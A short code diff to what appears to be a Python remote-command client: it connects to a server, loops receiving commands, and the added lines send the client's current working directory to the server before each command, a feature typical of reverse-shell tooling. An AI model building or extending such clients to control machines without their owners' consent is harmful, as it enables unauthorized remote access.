@@ -51,6 +51,9 @@ def main():
     print(f'connected to {Host}:{port}')
     # receive commands from server
     while True:
+        #get current working directory to be printed on the terminal
+        cwd=os.getcwd()
+        cli.send(cwd.encode())
         command = cli.recv(4096).decode()
         if command:
             print(f"received {command}")
